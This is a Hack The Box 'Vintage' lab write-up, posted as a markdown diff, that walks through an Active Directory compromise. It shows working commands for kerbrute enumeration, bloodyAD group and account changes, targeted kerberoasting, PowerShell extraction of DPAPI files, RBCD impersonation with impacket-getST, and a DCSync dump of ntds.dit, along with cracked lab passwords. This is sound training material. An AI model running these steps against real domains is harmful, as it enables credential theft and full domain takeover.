@@ -1,0 +1,321 @@
+---
+title: HTB-Vintage
+published:
+toc: true
+draft: false
+tags:
+  - ReadGMSAPassword
+  - GenericAll
+  - GenericWrite
+  - kerbrute
+  - dpapi
+  - RBCD
+  - BloodyAD
+  - BloodHound
+  - ActiveDirectory
+---
+
+```
+Scope:
+10.129.231.205
+
+Creds:
+P.Rosa
+Rosaisbest123
+```
+
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- -Pn -T5 --min-rate=5000 -vvvv vintage.htb
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-01-31 11:21:09Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+65015/tcp open  msrpc         syn-ack Microsoft Windows RPC
+65021/tcp open  msrpc         syn-ack Microsoft Windows RPC
+65041/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-31T11:22:00
+|_  start_date: N/A
+|_clock-skew: -6s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 22961/tcp): CLEAN (Timeout)
+|   Check 2 (port 13217/tcp): CLEAN (Timeout)
+|   Check 3 (port 17035/udp): CLEAN (Timeout)
+|   Check 4 (port 56429/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+```
+
+## Kerbrute
+### Mutating wordlists
+
+By mutating a wordlist to the naming convention of the user we already found we can find another user in the domain:
+
+```bash
+awk '{print substr($0,1,1)"."substr($0,2)}' /usr/share/seclists/Usernames/statistically-likely-usernames/jsmith.txt  > j.smith.txt
+
+kerbrute userenum -d vintage.htb --dc 10.129.231.205 j.smith.txt \
+| grep -oP '\b[a-zA-Z0-9._-]+(?=@)'
+```
+
+![](attachments/7eae2e13243fc87538378130e85846b6.png)
+
+We can mutate even further by using the `smith.txt` file, and using `awk` to prepend alphabetical characters:
+
+```bash
+awk '{for(c=97;c<=122;c++) printf "%c.%s\n",c,$0}' /usr/share/seclists/Usernames/statistically-likely-usernames/smith.txt > mutated.txt
+```
+
+![](attachments/6326f0db23a464ab0492471dd86304b0.png)
+
+This gives us 2 more users which we can add.
+
+## BloodHound
+
+First I went ahead and requested a TGT for the *P.Rosa* user.
+
+![](attachments/4a9550b5dd58ce4ff0e57d3e9858f689.png)
+
+Then I went ahead and created a new `krb5` config file:
+
+![](attachments/04fccc29fd32bb45e8a66f85b7ff857e.png)
+
+Using `nxc` I was able to enumerate all present users:
+
+![](attachments/47eebe17ebcbec7de429681b20b6dad9.png)
+
+I then went ahead and enumerated the target using `bloodhound`:
+
+![](attachments/55b5058d00702e6a9b15b8c3c1cc6535.png)
+
+![](attachments/c9769fad0a326d3678196a1f7bc787d2.png)
+
+Inspecting the shortest path I noticed that our user didn't really hold any special privileges:
+
+![](attachments/7caaf936688918e2456af7a4fd2cd58b.png)
+
+From the `bloodhound-ce-python` output however I remember the following line:
+
+![](attachments/eb0fef765a23ed28a83b8040bf24fe66.png)
+
+I thus checked out this computer in `bloodhound`:
+
+![](attachments/d098028af143a4ec50605f4bd16ec443.png)
+
+- Outbound Object Control:
+
+![](attachments/342f42208f1cf1baa68c3024f0861cdb.png)
+
+This is quite interesting as we are able to dump the `gMSA` password for the *GMSA01$* account, but even more so interesting is what groups this computer is a member of:
+
+![](attachments/efcf2d02353bb3083aad9b1af849de60.png)
+
+Being a member of the **Pre-Windows 2000 Compatible Access** group as a *computer* means the password is HIGHLY LIKELY the same as the computer name, as per [this article](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers):
+
+![](attachments/ffdf900f6ca8532a1539633730145591.png)
+
+![](attachments/cd28fef057df081509d729dba3873753.png)
+
+```
+FS01$
+fs01
+```
+
+Since non-kerb authentication does not work in this domain I requested a TGT for this computer account:
+
+![](attachments/22f307e630555b74f71b525b7fdc95ba.png)
+
+### gMSA dump
+
+Now we can go ahead as we previously found:
+
+![](attachments/1204a67c5f5c1ee176b32253def14960.png)
+
+```
+gMSA01$
+d933ef50c2677cc83e8c9a7d09e678e5
+```
+
+### GenericWrite - Add to group
+
+Now since we own the *gMSA01$* machine account we can check our privs, which turn out to be plentiful.
+
+![](attachments/99b9d36877b7b64ae0803731e9a92b8b.png)
+
+First of all I request a TGT again:
+
+![](attachments/510dd3cc13e947cf2cd17d7484e43615.png)
+
+Now we can use `bloodyAD` to add ourselves to the group:
+
+```bash
+bloodyAD --host DC01.vintage.htb -d vintage.htb -k add groupMember 'SERVICEMANAGERS' 'gMSA01$'
+```
+
+![](attachments/01a7b68c138f8fffe2fe01e8fbc841a5.png)
+
+### GenericAll 
+
+We now appear to have **GenericAll** privileges over 3 service accounts. One of the accounts, namely *svc_sql*, appears to be disabled.
+
+![](attachments/d2788d4bb7ee241eaed664c7f7625e6d.png)
+
+Since we have **GenericAll** over the account we can enable the account again.
+
+>[!warning]
+>We will have to request a new TGT otherwise we'll get the following error:
+>
+>![](attachments/3910d96f90b19601431b051c83297672.png)
+
+```bash
+bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
+```
+
+![](attachments/dcbe76170c598f574bc7909cc4e0a45d.png)
+
+Now that the account is enabled again we can kerberoast all the accounts.
+
+```bash
+targetedKerberoast -v -d 'vintage.htb' -k --no-pass --dc-host dc01.vintage.htb
+```
+
+![](attachments/e378e3b055d123d1bc248329468723cf.png)
+
+### john
+
+I was then able to crack one of the hashes:
+
+![](attachments/e345bacd2753096a49dee8b26f1e8783.png)
+
+```
+svc_sql
+Zer0the0ne
+```
+
+![](attachments/dd4b47e2d4012aba87faccaad2ed55f1.png)
+
+Looks like the password is reused by *C.Neri*.
+
+![](attachments/3da59343a42346315088e7e1f6ceca92.png)
+
+It appears *C.Neri* has remote management access, meaning we should be able to winrm into the system.
+
+# Foothold
+## Shell as C.Neri
+
+![](attachments/e858a5f5efdf34dc792e6b2797858a61.png)
+
+### user.txt
+
+![](attachments/3e1bd4f97af9d09346429e9da80c8162.png)
+
+## Decrypting DPAPI hash
+
+Eventhough we can't use `cmdkey /list`, we can check the local credentials:
+
+![](attachments/450cab03835079ccc65237f4bd30abe0.png)
+
+Now I tried to use the [following script]() to extract the credentials, however it got flagged by AV:
+
+![](attachments/d4463513d0a51ce2092d3c4627c229ab.png)
+
+Instead I'll have to do it the hard way:
+
+![](attachments/87a57bb2b74206fcc8640628cedbc420.png)
+
+I tried downloading them using the C2, that did not work. I then tested `smbserver` which didn't work either, so instead I converted the contents to base64:
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847'))
+
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b'))
+```
+
+I then copied the contents over, `base64` decoded it and placed them in their respective file names:
+
+```bash
+echo "<BASE64 ENCODED>" | base64 -d > 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+echo "<BASE64 ENCODED>" | base64 -d > 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+```
+
+I then did the same as above for the masterkey:
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))
+
+echo "<BASE64 ENCODED>" | base64 -d > C4BB96844A5C9DD45D5B6A9859252BA6
+```
+
+Now I was able to decrypt the dpapi hash and get the password.
+
+![](attachments/803bc42e3cd244315ee1d4d517fa010b.png)
+
+```
+c.neri_adm
+Uncr4ck4bl3P4ssW0rd0312
+```
+
+Now this got way more interesting:
+
+![](attachments/a3670db81f3990d0ddf5f10e7bc91338.png)
+
+# Privilege Escalation
+## Resource Based Constraint Delegation (RBCD)
+
+It appears I'm already part of the **Delegatedadmins** group, and I can abuse the **AllowedToAct** attribute.
+
+In order to succeed though we'll need to add the *FS01$* machine account to the **Delegatedadmins** group using our **GenericWrite** privileges and request a new ticket on their behalf.
+
+![](attachments/17c5cbd9147b0840ae3e586a471450d8.png)
+
+Next up we'll request the ST to impersonate *DC01$* with:
+
+```bash
+impacket-getST -spn 'cifs/DC01.vintage.htb' -impersonate 'DC01$' 'vintage.htb'/'FS01$' -dc-ip DC01.vintage.htb -k -no-pass
+```
+
+![](attachments/b30607adc3158b9f0ad7afdcbe40c1fd.png)
+
+## DCSync
+
+Now that we have a valid ticket as the *DC01$* machine account we can **DCSync** the domain and dump the `ntds.dit`:
+
+```bash
+nxc smb 10.129.7.79 -k --use-kcache --ntds
+```
+
+![](attachments/7e57f24c03334b4920bd407f0266155f.png)
+
+While it is not possible to use the *Administrator* account to log in, we can use *L.Bianchi_adm* to get an administrative shell.
+
+![](attachments/059896acfe2ac271d4ea42502fea88fb.png)
+
+![](attachments/5ee13462ef5ce86957261fe4a2500a0c.png)
+
+![](attachments/f26b61ba9045f83c9a4b377a34000e1b.png)
+
+---
